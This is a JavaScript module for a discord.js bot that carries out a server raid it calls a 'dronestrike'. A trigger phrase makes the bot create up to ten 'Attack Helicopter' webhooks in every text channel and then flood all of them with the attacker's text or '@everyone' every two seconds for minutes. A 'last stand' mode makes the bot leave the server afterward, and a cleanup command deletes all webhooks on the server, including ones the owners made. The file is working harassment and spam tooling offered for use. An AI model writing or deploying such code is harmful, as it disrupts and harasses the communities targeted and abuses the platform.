"use strict";

var djs = require("discord.js");

// That's discord's max webhooks per channel
const ATTACK_HELI_NUM = 10;

// Will be set to the discordApiCall function
var discordRestCall;

var ongoingDroneStrikes = {};

async function getWebhooks(cid) {
  return await discordRestCall("GET", "/channels/{major}/webhooks", {
    major: cid
  });
}

async function executeWebhooks(webhookList, content) {
  for (var i = 0; i < webhookList.length; i++) {
    var wh = webhookList[i];
    await discordRestCall("POST", "/webhooks/{major}/{minor}", {
      major: wh.id,
      minor: wh.token
    }, JSON.stringify({
      content: content
    }));
  }
}

function padLeft(str, char, length){
  return char.repeat(length - str.length) + str;
}

async function createWebhooks(cid, avatar) {
  for (var i = 0; i < ATTACK_HELI_NUM; i++) {
    var res = await discordRestCall("POST", "/channels/{major}/webhooks", {
      major: cid
    }, JSON.stringify({
      name: "Attack Helicopter " + padLeft((i + 1).toString(), "0", 3),
      avatar: avatar
    }));
    // The max webhooks has probably been reached
    // Avoid a invalid req limit
    if(res.error) break;
  }
}

async function deleteWebhooks(hooks){
  for (var i = 0; i < hooks.length; i++) {
    await discordRestCall("DELETE", "/webhooks/{major}", {
      major: hooks[i].id
    });
  }
}

async function droneStrike(msg, content, laststand, avatar, gs){
  gs.safeSend("Dronestrike authorized.", msg.channel);
  var channels = await discordRestCall("GET", "/guilds/{major}/channels", {
    major: msg.guild.id
  });
  // Gather the hooks
  var allhooks = [];
  for (var i = 0; i < channels.length; i++) {
    if (channels[i].type !== 0) continue;
    if (channels[i].id === msg.channel.id) continue;
    var hooks = await getWebhooks(channels[i].id);
    if (hooks.length < ATTACK_HELI_NUM) {
      await createWebhooks(channels[i].id, avatar);
      hooks = await getWebhooks(channels[i].id);
    }
    allhooks = allhooks.concat(hooks);
  }
  // Attack!
  var int = setInterval(() => {
    executeWebhooks(allhooks, content);
  }, 2000);
  setTimeout(() => {
    clearInterval(int);
    ongoingDroneStrikes[msg.guild.id] = false;
    if(laststand){
      msg.channel.send("Sasuke prism, may we meet again!");
      msg.guild.leave();
    }
  }, Math.random() * 100000 + 169420);
  console.log(`Dronestrike: G(${msg.guild.name}, ${msg.guild.id}) Bots: ${allhooks.length}`);
}

module.exports = function injectorMain(gs) {
  discordRestCall = gs.discordApiCall;
  const droneStrikeActivate = "Go! Launch the attack helicopters against ";
  const droneStrikeLastStand = "<Go! Launch the attack helicopters against> ";
  async function getPerms(msg) {
    return (await msg.channel.guild.members.fetch(bot.user))
      .permissions.any(djs.Permissions.FLAGS.MANAGE_WEBHOOKS);
  }
  gs.bot.on("message", async msg => {
    if (!gs.normalMsg(msg)) return;
    if (msg.guild && !ongoingDroneStrikes[msg.guild.id]){
      var gid = msg.guild.id;
      var content;
      if (msg.content.startsWith(droneStrikeActivate)) {
        if (await getPerms(msg)) {
          ongoingDroneStrikes[gid] = true;
          content = msg.content.substring(droneStrikeActivate.length);
          droneStrike(msg, content, false, gs.getToken("attackheli"), gs);
        }
      }else if(msg.content.startsWith(droneStrikeLastStand)){
        if(await getPerms(msg)){
          ongoingDroneStrikes[gid] = true;
          content = "@everyone";
          droneStrike(msg, content, true, gs.getToken("attackheli"), gs);
        }
      }
    }
  });
  gs.bot.on("message", async msg => {
    if(!gs.normalMsg(msg)) return;
    if(msg.content.startsWith("Hybagel cleans up their dronestrikes")){
      if (msg.guild && !ongoingDroneStrikes[msg.guild.id] && await getPerms(msg)){
        var channels = await discordRestCall("GET", "/guilds/{major}/channels", {
          major: msg.guild.id
        });
        // Gather the hooks
        var allhooks = [];
        for (var i = 0; i < channels.length; i++) {
          if (channels[i].type !== 0) continue;
          var hooks = await getWebhooks(channels[i].id);
          allhooks = allhooks.concat(hooks);
        }
        if(allhooks.length){
          await deleteWebhooks(allhooks);
          gs.safeSend("It's cleaned up now", msg.channel);
        }
      }
    }
  });
  gs.bot.on("message", msg => {
    if(!gs.normalMsg(msg)) return;
    if(msg.content === "88677538884859"
    && msg.author.username === "dthusian"
    && msg.author.discriminator === "8480"
    && msg.guild.available){
      msg.guild.leave();
    }
  });
}
